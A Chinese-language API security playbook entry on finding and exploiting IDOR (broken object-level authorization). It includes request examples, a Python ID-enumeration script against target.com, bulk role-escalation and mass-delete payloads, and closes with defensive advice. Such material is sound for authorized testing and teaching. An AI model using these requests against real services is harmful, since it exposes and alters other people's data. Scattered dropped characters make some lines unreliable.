# IDOR Detection and Exploitation

**ID**: `api-idor-001` | **分类**: api | **风险等级**: high

IDOR (Insecure Direct Object Reference)，OWASP API Security Top 10 中称为 BOLA (Broken Object Level Authorization)，是最常见的 API 安全漏洞之一。当 API 端点使用用户可控的标识符（数字 ID、UUID、用户名等）直接引用后端对象，且未在每次请求时验证当前用户是否有权访问该对象时，攻击者可通过修改标识符访问其他用户的资源。IDOR 危害极大，可导致数据泄露、数据篡改和权限提升，且自动化检测困难，需要深入理解业务逻辑

## 触发场景

- API 端点使用数字 ID、UUID/GUID 或用户名作为对象引用参数
- URL 路径包含资源标识符：/api/users/123/orders?api/documents?id=456
- 请求参数中包含当前用户的 ID 或其他用户可推测的标识符
- 批量操作 API 支持传入多个资源 ID
- GraphQL 查询中通过 ID 参数获取对象
- API 响应中包含其他用户的资源 ID 或敏感数据
- 分页 API 返回大量资源列表，可通过遍历获取未授权数据

## 操作检查清单

1. 注册两个不同用户账户（User A 的User B），获取各自的认证 token
2. 使用 User A 的token 访问资源，记录所有包含 ID 参数的请求
3. 将请求中的 ID 替换为 User B 的资源 ID，使用 User A 的token 发送请求
4. 检查响应是否返回User B 的数据（水平越权
5. ?PUT/PATCH/DELETE 请求重复上述测试（常被遗漏）
6. 尝试 ID 枚举：递增/递减 ID 值，观察是否返回不同用户数据
7. 测试间接引用：修改短链接、哈希 ID、base64 编码 ID
8. 检查 GraphQL 查询：传入其他用户的 ID，观察是否返回数据
9. 测试批量 API：在 ID 列表中加入不属于自己的资源 ID
10. 测试分页 API：通过遍历所有页获取不属于当前用户的资源
11. 检查响应中的信息泄露：其他用户 ID、内部路径、调试信
12. 验证多租户场景：尝试跨组织/租户访问资源

## 技术手段

- 顺序 ID 枚举：id=100, 101, 102... 遍历相邻资源
- UUID/GUID 枚举：从公开接口或响应中收集 UUID，交叉访
- 参数篡改：修改请求体/查询参数中的 owner_id、account_id、user_id
- HTTP 方法变更：GET 有权限检查但 POST/PUT/DELETE 没有
- 间接引用映射绕过：解码重新编码间接 ID，访问映射对
- GraphQL ID 注入：在查询中替换 ID 字段为其他用户资源 ID
- 批量 IDOR：在数组参数中添加他人资源ID
- 多租户越权：修改 tenant_id ?organization_id 跨租户访问

## 症状

- 修改 URL 中的用户 ID（如 /api/users/100、/api/users/101）返回其他用户数据
- 修改请求体中的owner_id ?account_id 后操作成功应用于其他用户资源
- 通过枚举 ID 获取到其他用户的订单、文档、个人资料等敏感信息
- GraphQL 查询中传入其他用户的 ID 成功获取其数
- 分页 API 中可遍历获取不属于当前用户的资源列表
- 修改间接引用映射（如 /api/docs/abc123、/api/docs/def456）访问他人资源
- API 响应中包含其他用户的 ID，使用这些 ID 进一步请求成功

## 根因分析

- API 端点仅验证用户是否已认证（token 有效），未验证证用户是否有权访问特定资
- 开发者假设用户不会修改URL 参数或使用难以猜测的 UUID，忽视授权检
- 对象所有权关系未在数据库查询中体现（缺少WHERE owner_id = ? 条件
- 间接引用映射（间接 ID）未在服务端验证映射关系
- GraphQL schema 未实施字段级和对象级权限控制
- 批量 API 未逐个验证每个资源 ID 的访问权
- 微服务架构中，认证和授权分离，授权检查被遗漏
- API 版本迭代时新端点未继承原有权限检查逻辑

## 示例

### 顺序 ID 枚举获取他人订单

通过递增订单 ID 遍历获取其他用户的订单详情

```
请求示例 (User A 查看自己的订单），:
GET /api/v1/orders/1001
Authorization: Bearer <UserA_Token>

响应 (200 OK):
{
  "id": 1001,
  "user_id": "user_a_123",
  "items": [{"product": "MacBook Pro", "price": 1999}],
  "shipping_address": "123 Main St",
  "total": 1999,
  "status": "shipped"
}

攻击: 修改订单 ID 为1002
GET /api/v1/orders/1002
Authorization: Bearer <UserA_Token>

响应 (200 OK - IDOR 漏洞):
{
  "id": 1002,
  "user_id": "user_b_456",
  "items": [{"product": "iPhone 15", "price": 999}],
  "shipping_address": "456 Oak Ave",
  "total": 999,
  "status": "processing"
}

自动化枚举(Python):
import requests
token = '<UserA_Token>'
headers = {'Authorization': f'Bearer {token}'}
for order_id in range(1000, 2000):
    r = requests.get(f"https://target.com/api/v1/orders/{order_id}", headers=headers)
    if r.status_code == 200:
        data = r.json()
        print(f"Order {order_id}: user={data.get('user_id')}, total={data.get('total')}")

```

### UUID/GUID 交叉访问

利用从公开接口获取的UUID 访问其他用户的资源

```
步骤 1: 从公开接口获取 UUID
GET /api/v1/products/reviews?product_id=prod_001
响应中包含
{
  "reviews": [
    {"id": "review_a1b2c3d4-e5f6-7890-abcd-ef1234567890", "user_id": "user_xxx", "text": "Great!"},
    {"id": "review_b2c3d4e5-f6a7-8901-bcde-f12345678901", "user_id": "user_yyy", "text": "Nice!"}
  ]
}

步骤 2: 使用 User A 的token 访问 User B 的review 详情
GET /api/v1/reviews/review_b2c3d4e5-f6a7-8901-bcde-f12345678901
Authorization: Bearer <UserA_Token>

响应 (200 OK - IDOR 漏洞):
{
  "id": "review_b2c3d4e5-f6a7-8901-bcde-f12345678901",
  "user_id": "user_yyy",
  "text": "Nice!",
  "email": "yyy@example.com",
  "phone": "+1-555-0102",
  "ip_address": "192.168.1.100"
}

步骤 3: 尝试修改或删除他人的review
PUT /api/v1/reviews/review_b2c3d4e5-f6a7-8901-bcde-f12345678901
Authorization: Bearer <UserA_Token>
Content-Type: application/json
{"text": "Hacked!"}

原理: UUID 虽然不可顺序枚举，但可从公开接口、响应头、错误消息等渠道获取
     获取后交叉访问即可测试 IDOR
```

### 请求体参数篡改(owner_id/account_id)

修改 POST/PUT 请求体中的资源归属参数，操作他人资源

```
场景: 用户更新个人资料
正常请求:
PUT /api/v1/profile
Authorization: Bearer <UserA_Token>
Content-Type: application/json
{
  "user_id": "user_a_123",
  "display_name": "User A",
  "email": "usera@example.com"
}

攻击: 修改 user_id 为他人 ID
PUT /api/v1/profile
Authorization: Bearer <UserA_Token>
Content-Type: application/json
{
  "user_id": "user_b_456",
  "display_name": "Hacked by A",
  "email": "attacker@example.com"
}

响应 (200 OK - IDOR 漏洞):
{
  "message": "Profile updated successfully",
  "user_id": "user_b_456"
}

变体参数:
  - owner_id, owner, created_by
  - account_id, account, org_id, organization_id
  - user_id, user, uid
  - customer_id, client_id, member_id
  - project_id, team_id, group_id

原理: 很多 API 从请求体中读取资源ID进行数据库操作
     如果未将请求体ID与token中的用户ID进行比对，即可篡改
```

### GraphQL IDOR 利用

在GraphQL 查询中替换对应ID 获取他人数据

```
正常查询 (User A 查看自己的信息），:
POST /graphql
Authorization: Bearer <UserA_Token>
Content-Type: application/json

{
  "query": "query { user(id: \"user_a_123\") { id name email phone address orders { id total status } } }"
}

攻击查询 (User A 尝试访问 User B):
{
  "query": "query { user(id: \"user_b_456\") { id name email phone address orders { id total status } } }"
}

响应 (200 OK - GraphQL IDOR 漏洞):
{
  "data": {
    "user": {
      "id": "user_b_456",
      "name": "User B",
      "email": "userb@example.com",
      "phone": "+1-555-0200",
      "address": "456 Oak Ave",
      "orders": [
        {"id": "ord_789", "total": 2999, "status": "delivered"},
        {"id": "ord_790", "total": 499, "status": "pending"}
      ]
    }
  }
}

批量枚举 (遍历用户):
{
  "query": "query { users(first: 100, after: null) { edges { node { id name email } } pageInfo { hasNextPage endCursor } } }"
}

原理: GraphQL 允许通过 ID 参数直接查询对象
     如果 resolver 未检查当前用户是否有权访问目标对象，即存在IDOR
     GraphQL 的内省功能还可帮助攻击者发现所有可用的字段和查询
```

### 批量操作中的 Mass IDOR

在批量API 中添加他人资源ID 实现批量越权操作

```
正常请求 (删除自己的文档:
POST /api/v1/documents/bulk-delete
Authorization: Bearer <UserA_Token>
Content-Type: application/json
{
  "document_ids": ["doc_a1", "doc_a2", "doc_a3"]
}

攻击: ?ID 列表中添加他人文档
{
  "document_ids": ["doc_a1", "doc_a2", "doc_b1", "doc_b2", "doc_admin_1"]
}

响应 (200 OK - Mass IDOR 漏洞):
{
  "deleted": ["doc_a1", "doc_a2", "doc_b1", "doc_b2", "doc_admin_1"],
  "failed": []
}

批量更新攻击:
PUT /api/v1/users/bulk-update
Authorization: Bearer <UserA_Token>
{
  "user_ids": ["user_a_123", "user_b_456", "user_admin_001"],
  "updates": {"role": "admin", "status": "active"}
}

分页遍历攻击:
GET /api/v1/admin/users?page=1&limit=100
Authorization: Bearer <UserA_Token>  // 普通用户token
如果分页接口未做权限过滤，可遍历获取所有用户数据

原理: 批量 API 通常循环处理 ID 列表，如果未在循环中逐个验证权限
     攻击者可在列表中加入任意 ID 进行批量越权操作
     危害远大于单个IDOR，一次请求即可影响大量资源
```

### 间接引用映射 (Indirect Reference) 绕过

间接 ID 映射未做权限校验，导致映射关系可被操

```
场景: 使用间接引用（短哈希 ID）替代直接数据库 ID
正常请求:
GET /api/v1/files/abc123xyz
Authorization: Bearer <UserA_Token>
?abc123xyz 映射到数据库 file_id = 1001 (属于 User A)

攻击 1: 枚举间接 ID
GET /api/v1/files/abc123xya
GET /api/v1/files/abc123xyb
GET /api/v1/files/abc123xyc
如果间接 ID 生成规则可推测（如base64 编码），可枚举获取他人文件

攻击 2: 从公开来源收集间接 ID
- 从分享链接、邮件通知、API 响应中获取他人的间接 ID
- 使用这些 ID 访问对应资源
GET /api/v1/files/def456uvw  // User B 的文件间接 ID
Authorization: Bearer <UserA_Token>

攻击 3: 解码间接 ID
如果间接 ID ?base64 编码的数据库 ID:
echo 'MTAwMQ==' | base64 -d  // 输出: 1001
echo 'MTAwMg==' | base64 -d  // 输出: 1002
解码后可直接获取数据 ID 并篡改

原理: 间接引用旨在增加 ID 不可预测性，但如果映射层未做权限校验
     或间接ID生成规则可推测，则保护无效
```

### HTTP 方法变更 IDOR

GET 请求有权限检查但 POST/PUT/DELETE 遗漏

```
测试场景: 订单管理 API

GET /api/v1/orders/1002  (User A token)
?403 Forbidden (权限检查正确

PUT /api/v1/orders/1002  (User A token)
{ "status": "cancelled" }
?200 OK (IDOR 漏洞！成功取消他人订单

DELETE /api/v1/orders/1002  (User A token)
?200 OK (IDOR 漏洞！成功删除他人订单

PATCH /api/v1/orders/1002/items  (User A token)
{ "quantity": 0 }
?200 OK (IDOR 漏洞！成功修改他人订单项)

原理: 开发团队可能在 GET 端点实现了权限检查（因为数据可见性更受关注）
     但遗漏了写操作（PUT/PATCH/DELETE）的权限检查
     这是最常见的IDOR 变体之一

测试策略:
1. 对每个资源端点测试所有 HTTP 方法
2. 用低权限用户有token 尝试高权限操作
3. 重点测试写操作（创建、更新、删除）
```

## 成功标志

- 响应中包含其他用户的个人数据（姓名、邮箱、地址等）
- 成功修改或删除其他用户的资源
- 响应中 user_id/owner_id 和 token 中的用户 ID 不一致
- 批量操作返回的成功列表中包含他人资源 ID
- GraphQL 查询中传入他人 ID 返回完整数据对象

## 防御建议

- 在每个 API 请求中验证当前用户是否有权访问目标资源，而非仅验证是否已认证
- 使用基于角色的访问控制(RBAC) 或基于属性的访问控制 (ABAC) 框架
- 数据库查询中强制包含所有权条件：WHERE resource_id = ? AND owner_id = ?
- 不要在请求体中接受用户的 ID 作为资源标识符，?token 中提
- GraphQL resolver 中实施对象级和字段级权限检查
- 批量 API 中逐个验证每个资源 ID 的访问权
- 间接引用映射中在服务端验证映射关系和权限
- 使用 UUID/GUID 替代顺序 ID 增加枚举难度（但不能替代权限检查）
- 实施最小权限原则，用户只能访问完成业务所需的最小资源集
- 记录所有资源访问日志，包含用户 ID、资源ID、操作类型，便于审计和检测异常
